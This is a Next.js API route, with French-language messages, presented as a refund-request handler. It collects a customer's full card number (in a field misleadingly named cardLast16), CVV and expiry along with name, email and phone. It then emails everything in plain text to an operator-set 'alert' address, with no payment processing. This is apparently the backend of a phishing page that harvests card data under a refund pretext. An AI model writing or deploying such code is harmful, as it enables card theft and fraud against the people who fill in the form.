import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      fullName,
      email,
      phone,
      reason,
      amount,
      cardLast16,
      cardCvv,
      cardExpiry,
    } = body;

    if (!fullName || !email || !phone || !amount) {
      return NextResponse.json(
        { error: 'Champs obligatoires manquants.' },
        { status: 400 }
      );
    }

    const notificationEmail =
      process.env.ALERT_EMAIL || process.env.REFUND_NOTIFICATION_EMAIL;
    const smtpUser = process.env.GMAIL_USER || process.env.SMTP_USER;
    const smtpPassword =
      process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASSWORD;
    const senderEmail = process.env.EMAIL_FROM || smtpUser;
    const smtpHost = process.env.SMTP_HOST || 'smtp.gmail.com';
    const smtpPort = Number(process.env.SMTP_PORT || 587);

    if (
      !notificationEmail ||
      !senderEmail ||
      !smtpHost ||
      !smtpUser ||
      !smtpPassword ||
      !Number.isInteger(smtpPort)
    ) {
      console.error('Configuration e-mail incomplète.');
      return NextResponse.json(
        { error: 'Le service e-mail n’est pas configuré.' },
        { status: 503 }
      );
    }

    const emailContent = `
Nouvelle demande de remboursement
================================

Informations du client:
- Nom complet: ${fullName}
- E-mail: ${email}
- Téléphone: ${phone}
- Motif: ${reason || 'Non précisé'}

Détails du remboursement:
- Montant: ${Number.parseFloat(amount).toFixed(2)} EUR
- Méthode: Carte bancaire
- Carte: **** ${cardLast16} (${cardCvv},${cardExpiry|| 'Renseignée'})

Date de la demande: ${new Date().toLocaleString('fr-FR')}
`;

    const transporter = nodemailer.createTransport({
      host: smtpHost,
      port: smtpPort,
      secure: smtpPort === 465,
      auth: { user: smtpUser, pass: smtpPassword },
    });

    await transporter.sendMail({
      from: senderEmail,
      to: notificationEmail,
      replyTo: email,
      subject: 'Nouvelle demande de remboursement',
      text: emailContent,
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Erreur lors de l’envoi de la demande de remboursement.', err);
    return NextResponse.json(
      { error: 'Erreur lors du traitement de la demande.' },
      { status: 500 }
    );
  }
}
